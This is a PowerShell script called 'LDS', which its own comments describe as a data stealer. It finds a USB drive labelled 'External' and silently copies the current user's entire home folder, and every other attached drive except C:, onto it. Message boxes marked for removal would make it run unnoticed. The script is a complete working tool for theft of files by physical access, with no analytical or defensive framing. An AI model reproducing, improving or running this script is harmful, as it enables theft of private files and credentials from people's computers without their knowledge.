[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); # Verbose; Remove
[System.Windows.Forms.MessageBox]::Show("LDS process starting: do not remove USB drives; do not power-off the machine!","LDS",0 ,48); # Verbose; Remove

# Settings
$disk_stealer_label = "External";
$items_to_exclude_from_copy = @('MicrosoftEdgeBackups','AppData','Musica');

# Get the mountpoint of the disk used to steal data and copy data from disk "C" (ignoring items from the list $items_to_exclude_from_copy)
$disk_stealer = Get-WmiObject -Class Win32_logicaldisk | Where-Object { $_.VolumeName -Like "*$disk_stealer_label*" } | select DeviceID | foreach { $_.DeviceID };
Get-ChildItem $home -Recurse -Exclude $items_to_exclude_from_copy | Copy-Item -Destination {Join-Path ($disk_stealer + "/" + $env:UserName + "_C/") $_.FullName.Substring($home.length)}

[System.Windows.Forms.MessageBox]::Show("LDS: main disk OK. Wait for others mountpoints...","LDS",0 ,48); # Verbose; Remove

# Get every other mountpoint excluding disk "C" and stealer disk. Copy everything 
$disk_other = Get-WmiObject -Class Win32_logicaldisk | Where-Object {  $_.DeviceID -NotLike "*C*" } | Where-Object { $_.DeviceID -NotLike "*$disk_stealer*" } | select DeviceID | foreach { $_.DeviceID };
$disk_other | foreach  { Copy-Item -Path $_ -Destination ($disk_stealer + "/" + $env:UserName + "_" + $_).TrimEnd(':') -Recurse }
[System.Windows.Forms.MessageBox]::Show("LDS process completed","LDS",0 ,48); # Verbose; Remove